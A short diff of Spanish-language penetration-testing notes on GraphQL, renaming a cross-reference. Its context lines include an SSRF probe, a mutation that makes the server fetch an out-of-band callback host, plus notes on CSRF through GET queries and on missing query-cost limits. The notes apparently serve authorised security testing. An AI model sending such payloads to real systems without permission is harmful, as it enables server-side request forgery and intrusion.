@@ -72,4 +72,4 @@ mutation { importData(url: "http://{TOKEN}.oast.host/") { ok } }  -- SSRF
 - "Query cost analysis" ausente se documenta como hardening, no como DoS
   demostrado.
 - Muchos endpoints GraphQL aceptan GET con query en URL → habilita CSRF en
-  mutaciones si no hay verificación de content-type (ver hunt-csrf).
+  mutaciones si no hay verificación de content-type (ver csrf).
